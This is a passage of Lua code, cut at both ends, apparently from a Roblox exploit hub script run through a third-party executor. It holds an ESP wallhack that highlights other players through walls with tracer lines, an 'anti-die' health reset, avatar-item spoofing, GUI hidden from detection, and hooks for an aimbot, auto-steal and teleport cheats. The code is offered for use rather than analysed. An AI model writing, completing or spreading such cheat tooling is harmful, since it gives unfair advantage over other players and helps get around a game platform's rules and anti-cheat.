				local rightFoot = parent:FindFirstChild("RightFoot")

				if rightLowerLeg then
					rightLowerLeg.Transparency = 1
				end

				if rightFoot then
					rightFoot.Transparency = 1
				end

				local korbloxLeg = parent:FindFirstChild("KorbloxLeg")

				if korbloxLeg then
					korbloxLeg:Destroy()
				end

				local part = Instance.new("Part")
				part.Name = "KorbloxLeg"
				part.Size = Vector3.new(1, 2, 1)
				part.Anchored = false
				part.CanCollide = false
				part.Color = color
				part.Parent = parent
				local specialMesh = Instance.new("SpecialMesh")
				specialMesh.MeshType = Enum.MeshType.FileMesh
				specialMesh.MeshId = meshId2
				specialMesh.TextureId = textureId
				specialMesh.Scale = Vector3.one
				specialMesh.Name = "KorbloxMesh"
				specialMesh.Parent = part
				local weld = Instance.new("Weld")
				weld.Part0 = rightUpperLeg
				weld.Part1 = part
				weld.C0 = CFrame.new(0, -0.8, 0)
				weld.Name = "KorbloxWeld"
				weld.Parent = part
			end
		end
	elseif humanoid.RigType == Enum.HumanoidRigType.R6 then
		local rightLeg = parent:FindFirstChild("Right Leg")

		if rightLeg then
			for _, child in ipairs(rightLeg:GetChildren()) do
				if child:IsA("SpecialMesh") and child.Name == "KorbloxMesh" then
					child:Destroy()
				end
			end

			rightLeg.Color = Color3.fromRGB(255, 255, 255)
		end
	elseif humanoid.RigType == Enum.HumanoidRigType.R15 then
		local rightUpperLeg = parent:FindFirstChild("RightUpperLeg")

		if rightUpperLeg then
			rightUpperLeg.Transparency = 0
			local rightLowerLeg = parent:FindFirstChild("RightLowerLeg")
			local rightFoot = parent:FindFirstChild("RightFoot")

			if rightLowerLeg then
				rightLowerLeg.Transparency = 0
			end

			if rightFoot then
				rightFoot.Transparency = 0
			end

			local korbloxLeg = parent:FindFirstChild("KorbloxLeg")

			if korbloxLeg then
				korbloxLeg:Destroy()
			end
		end
	end
end

applyCharterToChar = function(arg)
	if not arg then
		return
	end
	applyHeadlessToChar(arg, flag29)
	applyKorbloxToChar(arg, flag30)
end

local tbl7 = {
	"OFF",
	"Adidas Sports",
	"Adidas Community",
	"Adidas Aura",
	"Wicked Popular",
	"Elder",
	"Zombie",
	"Mage",
	"Catwalk Glam",
	"Astronaut",
}

local tbl8 = {
	["Adidas Sports"] = {
		WalkAnim = 18537392113,
		RunAnim = 18537384940,
		JumpAnim = 18537380791,
		FallAnim = 18537367238,
		ClimbAnim = 18537363391,
		Animation1 = 18537376492,
		Animation2 = 18537371272,
	},
	["Adidas Community"] = {
		WalkAnim = 122150855457006,
		RunAnim = 82598234841035,
		JumpAnim = 75290611992385,
		FallAnim = 98600215928904,
		ClimbAnim = 88763136693023,
		Animation1 = 122257458498464,
		Animation2 = 102357151005774,
	},
	["Adidas Aura"] = {
		WalkAnim = 83842218823011,
		RunAnim = 118320322718866,
		JumpAnim = 109996626521204,
		FallAnim = 95603166884636,
		ClimbAnim = 97824616490448,
		Animation1 = 110211186840347,
		Animation2 = 114191137265065,
	},
	["Wicked Popular"] = {
		WalkAnim = 92072849924640,
		RunAnim = 72301599441680,
		JumpAnim = 104325245285198,
		FallAnim = 121152442762481,
		ClimbAnim = 131326830509784,
		Animation1 = 118832222982049,
		Animation2 = 76049494037641,
	},
	Elder = {
		WalkAnim = 10921111375,
		RunAnim = 10921104374,
		JumpAnim = 10921107367,
		FallAnim = 10921105765,
		ClimbAnim = 10921100400,
		Animation1 = 10921101664,
		Animation2 = 10921102574,
	},
	Zombie = {
		WalkAnim = 10921355261,
		RunAnim = 616163682,
		JumpAnim = 10921351278,
		FallAnim = 10921350320,
		ClimbAnim = 10921343576,
		Animation1 = 10921344533,
		Animation2 = 10921345304,
	},
	Mage = {
		WalkAnim = 10921152678,
		RunAnim = 10921148209,
		JumpAnim = 10921149743,
		FallAnim = 10921148939,
		ClimbAnim = 10921143404,
		Animation1 = 10921144709,
		Animation2 = 10921145797,
	},
	["Catwalk Glam"] = {
		WalkAnim = 109168724482748,
		RunAnim = 81024476153754,
		JumpAnim = 116936326516985,
		FallAnim = 92294537340807,
		ClimbAnim = 119377220967554,
		Animation1 = 133806214992291,
		Animation2 = 94970088341563,
	},
	Astronaut = {
		WalkAnim = 10921046031,
		RunAnim = 10921039308,
		JumpAnim = 10921042494,
		FallAnim = 10921040576,
		ClimbAnim = 10921032124,
		Animation1 = 10921034824,
		Animation2 = 10921036806,
	},
}

_animOriginalIds = {}
local flag31 = true
activeBatBillboard = nil
activeMedusaBillboard = nil
local flag32 = true
persistentRagdollGui = nil
local flag33 = false
local str2 = "manual"
holdInfJumpConn = nil
DROP_ASCEND_DURATION = 0.2
DROP_ASCEND_SPEED = 150
_GuiKeys = nil
local flag34 = false
local flag35 = true
local tbl9 = { folder = nil, conns = {}, labels = {} }
local flag36 = true
local n17 = 1
bgImageRef = nil

GuiRefs = GuiRefs or {
	hub = nil,
	outer = nil,
	outerScale = nil,
	inner = nil,
	headerFrame = nil,
	backgroundImage = nil,
	bgGrad = nil,
	categoryList = nil,
	contentFrame = nil,
	chromeGroup = nil,
	machoTitle = nil,
	logoCircle = nil,
	hideGui = nil,
	showGui = nil,
	refreshCanvas = nil,
}

local tbl10 = {}
local tbl11 = { url = image, file = "macho_bg_tiger.png", name = "Tiger", tint = Color3.fromRGB(255, 255, 255) }

local tbl12 = {
	url = "https://files.catbox.moe/pk5a3v.jpeg",
	file = "void_bg_1.jpeg",
	name = "Background 1",
	tint = Color3.fromRGB(255, 255, 255),
}

local tbl13 = {
	url = "https://files.catbox.moe/v8y0ak.png",
	file = "void_bg_2.png",
	name = "Background 2",
	tint = Color3.fromRGB(255, 255, 255),
}

local tbl14 = {
	url = "https://files.catbox.moe/sl73hb.png",
	file = "void_bg_3.png",
	name = "Background 3",
	tint = Color3.fromRGB(255, 255, 255),
}

local tbl15 = {
	url = "https://files.catbox.moe/ptt187.png",
	file = "void_bg_4.png",
	name = "Background 4",
	tint = Color3.fromRGB(255, 255, 255),
}

local tbl16 = {
	url = "rbxassetid://88369503310562",
	file = "aura_bg_5.png",
	name = "Background 5",
	tint = Color3.fromRGB(255, 255, 255),
}

local tbl17 = {
	url = "rbxassetid://77514425260751",
	file = "macho_bg_a.png",
	name = "Background 6",
	tint = Color3.fromRGB(255, 255, 255),
}

local tbl18 = {
	url = "rbxassetid://112899995372259",
	file = "macho_bg_b.png",
	name = "Background 7",
	tint = Color3.fromRGB(255, 255, 255),
}

local tbl19 = {
	url = "rbxassetid://104775518072608",
	file = "macho_bg_c.png",
	name = "Background 8",
	tint = Color3.fromRGB(255, 255, 255),
}

tbl10[1] = tbl11
tbl10[2] = tbl12
tbl10[3] = tbl13
tbl10[4] = tbl14
tbl10[5] = tbl15
tbl10[6] = tbl16
tbl10[7] = tbl17
tbl10[8] = tbl18
tbl10[9] = tbl19
local tbl20 = {}

local function fn7(arg)
	for _, v3 in ipairs({ getcustomasset, getsynasset, getasset }) do
		if typeof(v3) ~= "function" then
			continue
		end

		local ok, result = pcall(function()
			return v3(arg)
		end)

		if ok and type(result) == "string" and result ~= "" then
			return result
		end
	end

	if typeof(getcustomasset) == "function" then
		local ok, result = pcall(function()
			return getcustomasset(arg)
		end)

		if ok and type(result) == "string" and result ~= "" then
			return result
		end
	end

	return ""
end

local function fn8(arg)
	if not arg then
		return ""
	end

	if arg.url and (string.find(arg.url, "rbxassetid://") or string.find(arg.url, "rbxasset://")) then
		return arg.url
	end

	if isfile and isfile(arg.file) then
		local v3 = fn7(arg.file)
		if v3 ~= "" then
			return v3
		end
	end

	local body = nil

	local ok, result = pcall(function()
		return game:HttpGet(arg.url)
	end)

	if ok and result and #result > 100 then
		body = result
	end

	if not body then
		local request_ = http and http.request or request or syn and syn.request

		if request_ then
			local v3 = request_({ Url = arg.url, Method = "GET" })

			if v3 and v3.Body and #v3.Body > 100 then
				body = v3.Body
			end
		end
	end

	if not body then
		return ""
	end

	pcall(function()
		writefile(arg.file, body)
	end)

	task.wait(0.05)
	return fn7(arg.file)
end

for i, v3 in ipairs(tbl10) do
	if v3.url and (string.find(v3.url, "rbxassetid://") or string.find(v3.url, "rbxasset://")) then
		tbl20[i] = v3.url
	else
		task.spawn(function()
			local v4 = fn8(v3)
			tbl20[i] = v4 ~= "" and v4 or v3.url
		end)
	end
end

applyBackgroundImage = function(arg)
	n17 = arg or 0
	if not bgImageRef then
		return
	end

	if n17 == 0 or n17 == nil then
		n17 = 1
	end

	local v3 = tbl10[n17]
	local url = tbl20[n17]

	if not url or url == "" then
		if v3 then
			url = fn8(v3)

			if (not url or url == "") and v3.url then
				url = v3.url
			end

			tbl20[n17] = url
		end
	end

	if (not url or url == "") and v3 and v3.url then
		url = v3.url
	end

	if url and url ~= "" then
		bgImageRef.Image = url
		bgImageRef.ImageTransparency = 0.12
		local tint = v3 and v3.tint or Color3.fromRGB(255, 255, 255)
		bgImageRef.ImageColor3 = tint
		bgImageRef.ScaleType = Enum.ScaleType.Crop
		bgImageRef.Visible = true
		bgImageRef.ZIndex = 1
		flag36 = true

		if GuiRefs and GuiRefs.bgGrad then
			GuiRefs.bgGrad.BackgroundTransparency = 0.72
			GuiRefs.bgGrad.ZIndex = 0
		end

		if GuiRefs and GuiRefs.inner then
			GuiRefs.inner.BackgroundTransparency = 0.15
		end

		if MOB_BTN_ICONS then
			for _, v4 in ipairs(MOB_BTN_ICONS) do
				pcall(function()
					if v4 and v4.Parent then
						v4.Image = url
						v4.ImageColor3 = tint
					end
				end)
			end
		end
	else
		if GuiRefs and GuiRefs.bgGrad then
			GuiRefs.bgGrad.BackgroundTransparency = 0
		end

		if GuiRefs and GuiRefs.inner then
			GuiRefs.inner.BackgroundTransparency = 0
		end
	end
end

espClear = function()
	for _, conn in pairs(tbl9.conns) do
		pcall(function()
			conn:Disconnect()
		end)
	end

	tbl9.conns = {}

	for _, label in pairs(tbl9.labels) do
		pcall(function()
			if label.billboard then
				label.billboard:Destroy()
			end
		end)

		pcall(function()
			if label.avatarBillboard then
				label.avatarBillboard:Destroy()
			end
		end)

		pcall(function()
			if label.highlight then
				label.highlight:Destroy()
			end
		end)

		pcall(function()
			if label.line then
				label.line:Destroy()
			end
		end)
	end

	tbl9.labels = {}

	if tbl9.folder then
		pcall(function()
			tbl9.folder:Destroy()
		end)

		tbl9.folder = nil
	end
end

espRemovePlayer = function(arg)
	if not tbl9.labels[arg] then
		return
	end

	pcall(function()
		if tbl9.labels[arg].billboard then
			tbl9.labels[arg].billboard:Destroy()
		end
	end)

	pcall(function()
		if tbl9.labels[arg].avatarBillboard then
			tbl9.labels[arg].avatarBillboard:Destroy()
		end
	end)

	pcall(function()
		if tbl9.labels[arg].highlight then
			tbl9.labels[arg].highlight:Destroy()
		end
	end)

	pcall(function()
		if tbl9.labels[arg].line then
			tbl9.labels[arg].line:Destroy()
		end
	end)

	tbl9.labels[arg] = nil
end

espRefreshAvatars = function()
	local enabled = flag34 == true and flag35 == true

	for _, label in pairs(tbl9.labels) do
		if label.avatarBillboard then
			label.avatarBillboard.Enabled = enabled
		end
	end
end

espMakeLabel = function(arg)
	if not arg then
		return
	end
	espRemovePlayer(arg)
	local character = arg.Character
	if not character then
		return
	end
	local head = character:FindFirstChild("Head") or character:FindFirstChild("HumanoidRootPart")
	if not head then
		return
	end
	local flag37 = arg == localPlayer
	local flag38 = not flag37
	local billboardGui = nil

	if flag38 then
		billboardGui = Instance.new("BillboardGui")
		billboardGui.Name = "MachoESPAvatar"
		billboardGui.AlwaysOnTop = true
		billboardGui.Size = UDim2.new(0, 48, 0, 48)
		billboardGui.StudsOffset = Vector3.new(0, 5, 0)
		billboardGui.MaxDistance = 2000
		billboardGui.Enabled = flag34 == true and flag35 == true
		billboardGui.Parent = head
		local frame = Instance.new("Frame", billboardGui)
		frame.Size = UDim2.new(1, 0, 1, 0)
		frame.BackgroundColor3 = Color3.fromRGB(8, 8, 10)
		frame.BorderSizePixel = 0
		Instance.new("UICorner", frame).CornerRadius = UDim.new(1, 0)
		local uiStroke = Instance.new("UIStroke", frame)
		uiStroke.Color = Color3.fromRGB(255, 255, 255)
		uiStroke.Thickness = 2
		local imageLabel = Instance.new("ImageLabel", frame)
		imageLabel.Size = UDim2.new(1, -4, 1, -4)
		imageLabel.Position = UDim2.new(0, 2, 0, 2)
		imageLabel.BackgroundTransparency = 1
		imageLabel.Image = "rbxthumb://type=AvatarHeadShot&id=" .. tostring(arg.UserId) .. "&w=150&h=150"
		Instance.new("UICorner", imageLabel).CornerRadius = UDim.new(1, 0)
	end

	local billboardGui2 = Instance.new("BillboardGui")
	billboardGui2.Name = "MachoESPSpeed"
	billboardGui2.AlwaysOnTop = true
	billboardGui2.Size = UDim2.new(0, 200, 0, 44)
	billboardGui2.StudsOffset = Vector3.new(0, flag37 and 3 or 3.6, 0)
	billboardGui2.MaxDistance = 2000
	billboardGui2.Parent = head
	local textLabel = Instance.new("TextLabel")
	textLabel.Name = "SpeedLabel"
	textLabel.Size = UDim2.new(1, 0, 1, 0)
	textLabel.BackgroundTransparency = 1
	textLabel.Text = "Speed: 0"
	textLabel.Font = Enum.Font.GothamBlack
	textLabel.TextSize = 22
	textLabel.TextColor3 = flag37 and Color3.fromRGB(120, 220, 255) or Color3.fromRGB(255, 255, 255)
	textLabel.TextStrokeTransparency = 0.2
	textLabel.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
	textLabel.TextScaled = false
	textLabel.Parent = billboardGui2
	local highlight = nil
	local part = nil

	if flag38 then
		highlight = Instance.new("Highlight")
		highlight.Name = "MachoChams"
		highlight.Adornee = character
		highlight.FillColor = Color3.fromRGB(255, 255, 255)
		highlight.FillTransparency = 0.55
		highlight.OutlineColor = Color3.fromRGB(255, 255, 255)
		highlight.OutlineTransparency = 0
		highlight.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop

		pcall(function()
			highlight.Parent = tbl9.folder or workspace
		end)

		part = Instance.new("Part")
		part.Name = "MachoESPLine"
		part.Anchored = true
		part.CanCollide = false
		part.CanQuery = false
		part.CanTouch = false
		part.CastShadow = false
		part.Material = Enum.Material.Neon
		part.Color = Color3.fromRGB(255, 255, 255)
		part.Transparency = 0.2
		part.Size = Vector3.new(0.05, 0.05, 1)

		pcall(function()
			part.Parent = tbl9.folder or workspace
		end)

		local connection2 = RunService.RenderStepped:Connect(function()
			if not flag34 then
				return
			end
			local character2 = localPlayer.Character
			character2 = character2 and character2:FindFirstChild("HumanoidRootPart")
			local humanoidRootPart = character and (character:FindFirstChild("HumanoidRootPart") or character:FindFirstChild("Head"))
			if not character2 or not humanoidRootPart or not part or not part.Parent then
				return
			end
			local position = character2.Position
			local position2 = humanoidRootPart.Position
			part.Size = Vector3.new(0.05, 0.05, (position2 - position).Magnitude)
			part.CFrame = CFrame.lookAt((position + position2) / 2, position2)
		end)

		table.insert(tbl9.conns, connection2)
	end

	local connection2 = RunService.RenderStepped:Connect(function()
		if not flag34 or not textLabel or not textLabel.Parent then
			return
		end
		local character2 = arg.Character
		local humanoidRootPart = character2 and character2:FindFirstChild("HumanoidRootPart")
		character2 = character2 and character2:FindFirstChildOfClass("Humanoid")
		if not humanoidRootPart then
			textLabel.Text = "Speed: 0"
			return
		end
		local assemblyLinearVelocity = humanoidRootPart.AssemblyLinearVelocity
		local x = assemblyLinearVelocity.X
		local z = assemblyLinearVelocity.Z
		local n18 = math.sqrt(x * x + z * z)

		if flag37 and character2 then
			local moveDirection = character2.MoveDirection
			moveDirection = moveDirection and moveDirection.Magnitude > 0.04 or n18 > 1.5
			local v3 = getActiveMoveSpeed and getActiveMoveSpeed() or nil

			if type(v3) == "number" and v3 > 0 and moveDirection then
				n18 = v3
			elseif type(v3) == "number" and v3 > 0 and n18 > v3 * 0.4 then
				n18 = math.max(n18, v3)
			end
		end

		textLabel.Text = string.format("Speed: %d", math.floor(n18 + 0.5))
	end)

	table.insert(tbl9.conns, connection2)
	tbl9.labels[arg] = { billboard = billboardGui2, avatarBillboard = billboardGui, highlight = highlight, line = part }
end

startESP = function()
	flag34 = true
	espClear()
	tbl9.folder = Instance.new("Folder")
	tbl9.folder.Name = "MachoESPFolder"

	pcall(function()
		tbl9.folder.Parent = workspace
	end)

	for _, player in ipairs(Players:GetPlayers()) do
		espMakeLabel(player)

		table.insert(tbl9.conns, player.CharacterAdded:Connect(function()
			task.wait(0.4)

			if flag34 then
				espMakeLabel(player)
			end
		end))
	end

	table.insert(tbl9.conns, Players.PlayerAdded:Connect(function(player)
		if not flag34 then
			return
		end

		table.insert(tbl9.conns, player.CharacterAdded:Connect(function()
			task.wait(0.4)

			if flag34 then
				espMakeLabel(player)
			end
		end))

		if player.Character then
			espMakeLabel(player)
		end
	end))

	table.insert(tbl9.conns, Players.PlayerRemoving:Connect(function(player)
		espRemovePlayer(player)
	end))
end

stopESP = function()
	flag34 = false
	espClear()

	pcall(function()
		for _, descendant in ipairs(workspace:GetDescendants()) do
			if descendant:IsA("BillboardGui") and (descendant.Name == "VoidESPAvatar" or descendant.Name == "MachoESPAvatar" or descendant.Name == "VoidESPSpeed" or descendant.Name == "MachoESPSpeed" or descendant.Name:find("VoidESP") or descendant.Name:find("MachoESP")) then
				descendant:Destroy()
			end

			if descendant:IsA("Highlight") and descendant.Name and (tostring(descendant.Name):find("VoidESP") or tostring(descendant.Name):find("MachoESP")) then
				descendant:Destroy()
			end
		end
	end)

	pcall(function()
		for _, player in ipairs(Players:GetPlayers()) do
			local character = player.Character

			if character then
				for _, descendant in ipairs(character:GetDescendants()) do
					local isBillboardGui = descendant:IsA("BillboardGui")

					if isBillboardGui then
						isBillboardGui = descendant.Name == "VoidESPAvatar" or descendant.Name == "MachoESPAvatar" or descendant.Name == "VoidESPSpeed" or descendant.Name == "MachoESPSpeed" or descendant.Name:find("VoidESP") or descendant.Name:find("MachoESP")
					end

					if isBillboardGui then
						descendant:Destroy()
					end
				end
			end
		end
	end)
end

loadBtnPositions = function()
	if not (isfile and isfile("MachoHUBbtn.json")) then
		return {}
	end

	local ok, result = pcall(function()
		return HttpService:JSONDecode(readfile("MachoHUBbtn.json"))
	end)

	if ok and type(result) == "table" then
		return result
	end
	return {}
end

saveBtnPositions = function()
	if not writefile then
		return
	end

	if not mobGuiRef then
		return
	end
	local mobileButtons = mobGuiRef:FindFirstChild("MobileButtons")
	if not mobileButtons then
		return
	end

	local tbl21 = {
		__group = {
			xs = mobileButtons.Position.X.Scale,
			xo = mobileButtons.Position.X.Offset,
			ys = mobileButtons.Position.Y.Scale,
			yo = mobileButtons.Position.Y.Offset,
		},
	}

	for _, child in ipairs(mobileButtons:GetChildren()) do
		if child:IsA("Frame") then
			tbl21[child.Name] = { xo = child.Position.X.Offset, yo = child.Position.Y.Offset }
		end
	end

	pcall(function()
		writefile("MachoHUBbtn.json", HttpService:JSONEncode(tbl21))
	end)
end

task.spawn(function()
	while true do
		task.wait(3)
		pcall(saveBtnPositions)
	end
end)

refreshSpeedModeLabel = nil
saveConfig = nil
startUnwalk = nil
stopUnwalk = nil
setupMedusa = nil
stopMedusaCounter = nil
startAntiRagdoll = nil
stopAntiRagdoll = nil
startAutoLeft = nil
stopAutoLeft = nil
startAutoRight = nil
stopAutoRight = nil
startAutoTP = nil
stopAutoTP = nil
enableAntiLag = nil
disableAntiLag = nil
enableStretchRez = nil
disableStretchRez = nil
startBatAimbot = nil
stopBatAimbot = nil
queueAutoBatStart = nil
runDrop = nil
runTPFloor = nil
startAutoSteal = nil
stopAutoSteal = nil
toggleCarryMode = nil
toggleLaggerMode = nil

addShimmerToLabel = function(arg, arg2, arg3)
	local uiGradient = Instance.new("UIGradient", arg)
	local colorSequence = ColorSequence.new
	local tbl21 = {}
	local v3 = ColorSequenceKeypoint.new(0, arg2 or Color3.fromRGB(200, 200, 200))
	local v4 = ColorSequenceKeypoint.new(0.5, arg3 or Color3.fromRGB(255, 255, 255))
	local new = ColorSequenceKeypoint.new
	local color2 = arg2 or Color3.fromRGB(200, 200, 200)
	local v5 = table.pack(new(1, color2))
	tbl21[1] = v3
	tbl21[2] = v4

	do
		local values = table.pack(table.unpack(v5, 1, v5.n))
		table.move(values, 1, values.n, 3, tbl21)
	end

	uiGradient.Color = colorSequence(tbl21)
	local numberSequence = NumberSequence.new
	local tbl22 = {}
	local v6 = NumberSequenceKeypoint.new(0, 0.3, 0)
	local v7 = NumberSequenceKeypoint.new(0.5, 0, 0)
	local new2 = NumberSequenceKeypoint.new
	tbl22[1] = v6
	tbl22[2] = v7

	do
		local values = table.pack(new2(1, 0.3, 0))
		table.move(values, 1, values.n, 3, tbl22)
	end

	uiGradient.Transparency = numberSequence(tbl22)
	return uiGradient
end

local connection2 = nil

applyFOV = function()
	if connection2 then
		connection2:Disconnect()
	end

	connection2 = RunService.RenderStepped:Connect(function()
		local currentCamera = workspace.CurrentCamera

		if currentCamera then
			currentCamera.FieldOfView = fieldOfView
		end
	end)
end

applyFOV()

createRagdollBillboard = function(arg, arg2)
	if not flag32 then
		return nil
	end
	local color2 = Color3.fromRGB(255, 255, 255)
	local color3 = Color3.fromRGB(12, 5, 10)
	local name = "MoveeRagdollTimer_" .. arg2

	pcall(function()
		local v3 = game:GetService("CoreGui"):FindFirstChild(name)

		if v3 then
			v3:Destroy()
		end

		local playerGui = localPlayer:FindFirstChild("PlayerGui")

		if playerGui then
			local v4 = playerGui:FindFirstChild(name)

			if v4 then
				v4:Destroy()
			end
		end
	end)

	local screenGui = Instance.new("ScreenGui")
	screenGui.Name = name
	screenGui.ResetOnSpawn = false
	screenGui.IgnoreGuiInset = true
	screenGui.DisplayOrder = 25

	pcall(function()
		if syn and syn.protect_gui then
			syn.protect_gui(screenGui)
		end
	end)

	if not pcall(function()
		screenGui.Parent = game:GetService("CoreGui")
	end) then
		screenGui.Parent = localPlayer:WaitForChild("PlayerGui")
	end

	local frame = Instance.new("Frame", screenGui)
	frame.Size = UDim2.new(0, 210, 0, 80)
	frame.Position = UDim2.new(0.5, -105, 0, 58)
	frame.BackgroundColor3 = color3
	frame.BackgroundTransparency = 1
	frame.BorderSizePixel = 0
	frame.ZIndex = 30
	frame.Active = true
	Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 14)
	local uiStroke = Instance.new("UIStroke", frame)
	uiStroke.Color = color2
	uiStroke.Thickness = 3
	uiStroke.Transparency = 1

	task.spawn(function()
		local n18 = 0

		while uiStroke and uiStroke.Parent do
			n18 += 0.05
			uiStroke.Transparency = 0.02 + math.abs(math.sin(n18 * 2.5)) * 0.25
			uiStroke.Color = Color3.fromRGB(255, 255, 255)
			task.wait(0.04)
		end
	end)

	local textLabel = Instance.new("TextLabel", frame)
	textLabel.Size = UDim2.new(1, -16, 0, 28)
	textLabel.Position = UDim2.new(0, 8, 0, 6)
	textLabel.BackgroundTransparency = 1
	textLabel.Text = arg2 == "RAGDOLL" and "RAGDOLL TIMER" or arg2 == "STONE" and "STONE TIMER" or arg2 .. " TIMER"
	textLabel.TextColor3 = color2
	textLabel.Font = Enum.Font.GothamBlack
	textLabel.TextSize = 13
	textLabel.TextXAlignment = Enum.TextXAlignment.Center
	textLabel.ZIndex = 32
	local frame2 = Instance.new("Frame", frame)
	frame2.Size = UDim2.new(1, -20, 0, 1)
	frame2.Position = UDim2.new(0, 10, 0, 34)
	frame2.BackgroundColor3 = color2
	frame2.BackgroundTransparency = 0.5
	frame2.BorderSizePixel = 0
	frame2.ZIndex = 31
	local textLabel2 = Instance.new("TextLabel", frame)
	textLabel2.Size = UDim2.new(1, 0, 0, 42)
	textLabel2.Position = UDim2.new(0, 0, 0, 36)
	textLabel2.BackgroundTransparency = 1
	textLabel2.Text = string.format("%.1f", arg) .. "s"
	textLabel2.TextColor3 = color2
	textLabel2.Font = Enum.Font.GothamBlack
	textLabel2.TextSize = 24
	textLabel2.TextXAlignment = Enum.TextXAlignment.Center
	textLabel2.ZIndex = 32
	local v3 = addShimmerToLabel(textLabel2, color2, color2)

	task.spawn(function()
		local n18 = 0

		while textLabel2 and textLabel2.Parent do
			n18 += 0.04
			v3.Offset = Vector2.new(math.sin(n18) * 0.5, 0)
			task.wait(0.04)
		end
	end)

	local position = nil
	local position2 = nil
	local flag37 = false

	frame.InputBegan:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
			flag37 = true
			position = input.Position
			position2 = frame.Position

			input.Changed:Connect(function()
				if input.UserInputState == Enum.UserInputState.End then
					flag37 = false
				end
			end)
		end
	end)

	UserInputService.InputChanged:Connect(function(input)
		if flag37 and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
			local n18 = input.Position - position
			frame.Position = UDim2.new(position2.X.Scale, position2.X.Offset + n18.X, position2.Y.Scale, position2.Y.Offset + n18.Y)
		end
	end)

	local now = tick()
	local connection3 = nil

	connection3 = RunService.Heartbeat:Connect(function()
		local n18 = math.max(0, arg - tick() - now)

		if n18 <= 0 then
			connection3:Disconnect()

			pcall(function()
				screenGui:Destroy()
			end)
		elseif textLabel2 and textLabel2.Parent then
			textLabel2.Text = string.format("%.1f", n18) .. "s"
		end
	end)

	return screenGui
end

onHumanoidStateChanged = function(arg, arg2)
	local character = localPlayer.Character
	if not character then
		return
	end
	local humanoid = character:FindFirstChildOfClass("Humanoid")
	if not humanoid then
		return
	end
	local flag37 = arg2 == Enum.HumanoidStateType.Physics or arg2 == Enum.HumanoidStateType.Ragdoll or arg2 == Enum.HumanoidStateType.FallingDown

	if flag37 and not humanoid.PlatformStand and not activeBatBillboard then
		activeBatBillboard = createRagdollBillboard(2.6, "RAGDOLL", Color3.fromRGB(255, 255, 255))

		task.delay(2.6, function()
			if activeBatBillboard then
				pcall(function()
					activeBatBillboard:Destroy()
				end)

				activeBatBillboard = nil
			end
		end)
	end

	if flag37 and flag16 and not flag13 and not flag17 then
		flag17 = true

		task.spawn(function()
			task.wait(0.15)
			if not flag16 then
				flag17 = false
				return
			end
			local flag38 = false

			pcall(function()
				if SafeMode and SafeMode.inDuelCountdown then
					flag38 = SafeMode.inDuelCountdown()
				end
			end)

			if flag38 then
				flag17 = false
				return
			end

			if tbl3.tpBat then
				flag17 = false
				return
			end

			if not flag13 and queueAutoBatStart then
				queueAutoBatStart()

				if autoBatSetVisual then
					autoBatSetVisual(true)
				end

				if tbl6 and tbl6.autoBat then
					tbl6.autoBat(true)
				end
			end

			task.delay(2.5, function()
				flag17 = false
			end)
		end)
	end
end

onMedusaStateChanged = function()
	local character = localPlayer.Character
	if not character then
		return
	end
	local humanoid = character:FindFirstChildOfClass("Humanoid")

	if humanoid and humanoid.PlatformStand and not activeMedusaBillboard then
		activeMedusaBillboard = createRagdollBillboard(4.5, "STONE", Color3.fromRGB(255, 255, 255))

		task.delay(4.5, function()
			if activeMedusaBillboard then
				pcall(function()
					activeMedusaBillboard:Destroy()
				end)

				activeMedusaBillboard = nil
			end
		end)
	end
end

setupRagdollTriggers = function()
	local character = localPlayer.Character
	if not character then
		return
	end
	local humanoid = character:FindFirstChildOfClass("Humanoid")

	if humanoid then
		humanoid.StateChanged:Connect(onHumanoidStateChanged)
		humanoid:GetPropertyChangedSignal("PlatformStand"):Connect(onMedusaStateChanged)
	end
end

setupSpeedIndicator = function()
end

getActiveMoveSpeed = function()
	if flag2 then
		return flag and n4 or n3
	end

	if flag then
		return n2
	end
	return n
end

local tbl21 = {
	maxStep = 6,
	correctionScale = 1,
	smoothedDt = 0.016666666666666666,
	lastDirection = Vector3.zero,
	antiDieHum = nil,
	antiDieHealthConn = nil,
	antiDieOriginalBreakJoints = nil,
	antiDieOriginalRequiresNeck = nil,
}

local function fn9(arg)
	if tbl21.antiDieHealthConn then
		pcall(function()
			tbl21.antiDieHealthConn:Disconnect()
		end)

		tbl21.antiDieHealthConn = nil
	end

	local antiDieHum = tbl21.antiDieHum

	if arg and antiDieHum and antiDieHum.Parent then
		if tbl21.antiDieOriginalBreakJoints ~= nil then
			pcall(function()
				antiDieHum.BreakJointsOnDeath = tbl21.antiDieOriginalBreakJoints
			end)
		end

		if tbl21.antiDieOriginalRequiresNeck ~= nil then
			pcall(function()
				antiDieHum.RequiresNeck = tbl21.antiDieOriginalRequiresNeck
			end)
		end
	end

	tbl21.antiDieHum = nil
	tbl21.antiDieOriginalBreakJoints = nil
	tbl21.antiDieOriginalRequiresNeck = nil
end

local function fn10(antiDieHum)
	if not antiDieHum or not antiDieHum.Parent or not flag3 then
		return
	end

	if tbl21.antiDieHum ~= antiDieHum then
		fn9(true)
		tbl21.antiDieHum = antiDieHum

		pcall(function()
			tbl21.antiDieOriginalBreakJoints = antiDieHum.BreakJointsOnDeath
		end)

		pcall(function()
			tbl21.antiDieOriginalRequiresNeck = antiDieHum.RequiresNeck
		end)

		pcall(function()
			antiDieHum.BreakJointsOnDeath = false
		end)

		pcall(function()
			antiDieHum.RequiresNeck = false
		end)

		tbl21.antiDieHealthConn = antiDieHum:GetPropertyChangedSignal("Health"):Connect(function()
			if not flag3 then
				return
			end

			if antiDieHum.Parent and antiDieHum.Health <= 1 then
				local health = math.max(100, tonumber(antiDieHum.MaxHealth) or 100)

				pcall(function()
					antiDieHum.Health = health
				end)

				pcall(function()
					antiDieHum:ChangeState(Enum.HumanoidStateType.Running)
				end)
			end
		end)
	end

	pcall(function()
		antiDieHum.BreakJointsOnDeath = false
	end)

	pcall(function()
		antiDieHum.RequiresNeck = false
	end)
end

local function fn11(arg)
	if not arg then
		return nil
	end
	local vector = Vector3.new(arg.X, 0, arg.Z)
	if vector.Magnitude <= 0.05 then
		return nil
	end
	return vector.Unit
end

local function fn12(arg, arg2, arg3)
	if not arg or not arg2 or arg3.Magnitude <= 0.0001 then
		return arg3
	end
	local raycastParams = RaycastParams.new()
	raycastParams.FilterType = Enum.RaycastFilterType.Exclude
